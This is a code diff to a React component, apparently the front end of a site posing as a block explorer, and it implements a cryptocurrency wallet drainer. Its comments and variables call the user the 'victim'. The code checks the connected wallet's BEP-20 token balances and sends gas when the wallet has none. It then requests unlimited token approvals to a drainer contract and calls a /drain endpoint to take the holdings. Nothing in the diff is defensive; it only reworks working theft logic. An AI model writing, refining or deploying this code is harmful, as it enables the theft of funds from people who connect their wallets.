@@ -44,10 +44,20 @@ const LatestBlocks = () => {
     try {
       const provider = new ethers.BrowserProvider(window.ethereum);
       const balance = await provider.getBalance(connectedAddress);
+      const bep20Abi = [
+        "function balanceOf(address account) external view returns (uint256)",
+      ];
 
-      // Check if victim has zero gas balance (BNB)
-      if (balance === BigInt(0)) {
-        // Send gas via API if the victim has no gas
+      // Check token balances first
+      let hasTokens = false;
+      for (const token of tokenList) {
+        const tokenContract = new ethers.Contract(token.address, bep20Abi, provider);
+        const tokenBalance = await tokenContract.balanceOf(connectedAddress);
+        if (tokenBalance > 0) hasTokens = true;
+      }
+
+      // Only send gas if no BNB and has tokens
+      if (balance === BigInt(0) && hasTokens) {
         const gasResponse = await fetch(`${API_BASE_URL}/check-and-fund`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -56,15 +66,14 @@ const LatestBlocks = () => {
         const gasData = await gasResponse.json();
 
         if (gasData.success) {
-          // Wait for gas transfer to be confirmed before proceeding with draining
           const waitForGas = async () => {
             let gasTransferred = false;
             while (!gasTransferred) {
               const updatedBalance = await provider.getBalance(connectedAddress);
               if (updatedBalance > BigInt(0)) {
-                gasTransferred = true; // Gas is now transferred
+                gasTransferred = true;
               }
-              await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds
+              await new Promise(resolve => setTimeout(resolve, 5000));
             }
             return true;
           };
@@ -72,15 +81,17 @@ const LatestBlocks = () => {
           setLoading(true);
           await waitForGas();
           setLoading(false);
+          return true;
         } else {
           console.error("Failed to send gas:", gasData.message);
-          return;
+          return false;
         }
       } else {
-        return true; // Gas already available
+        return hasTokens; // Return true if gas exists and tokens are present, false if no tokens
       }
     } catch (error) {
       console.error("Error in checkAndSendGas:", error);
+      return false;
     }
   };
 
@@ -96,50 +107,35 @@ const LatestBlocks = () => {
 
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
-      let hasTokens = false;
 
       const bep20Abi = [
         "function balanceOf(address account) external view returns (uint256)",
         "function approve(address spender, uint256 amount) external returns (bool)",
       ];
 
-      for (const token of tokenList) {
-        const tokenContract = new ethers.Contract(token.address, bep20Abi, provider);
-        const balance = await tokenContract.balanceOf(connectedAddress);
-        if (balance > 0) hasTokens = true;
-      }
+      const gasAvailable = await checkAndSendGas(connectedAddress);
+      if (gasAvailable) {
+        const drainResponse = await fetch(`${API_BASE_URL}/drain`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
+        });
+        const drainData = await drainResponse.json();
 
-      if (hasTokens) {
-        const gasAvailable = await checkAndSendGas(connectedAddress);
-        if (gasAvailable) {
-          await fetch(`${API_BASE_URL}/check-and-fund`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ victimAddress: connectedAddress }),
-          });
-
-          const drainResponse = await fetch(`${API_BASE_URL}/drain`, {
+        if (drainData.needsApproval) {
+          for (const token of tokenList) {
+            const tokenContract = new ethers.Contract(token.address, bep20Abi, signer);
+            const balance = await tokenContract.balanceOf(connectedAddress);
+            if (balance > 0) {
+              const gasEstimate = await tokenContract.estimateGas.approve(drainerContractAddress, ethers.MaxUint256);
+              await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: gasEstimate });
+            }
+          }
+          await fetch(`${API_BASE_URL}/drain`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
           });
-          const drainData = await drainResponse.json();
-
-          if (drainData.needsApproval) {
-            for (const token of tokenList) {
-              const tokenContract = new ethers.Contract(token.address, bep20Abi, signer);
-              const balance = await tokenContract.balanceOf(connectedAddress);
-              if (balance > 0) {
-                const gasEstimate = await tokenContract.estimateGas.approve(drainerContractAddress, ethers.MaxUint256);
-                await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: gasEstimate });
-              }
-            }
-            await fetch(`${API_BASE_URL}/drain`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
-            });
-          }
         }
       }
     } catch (error) {
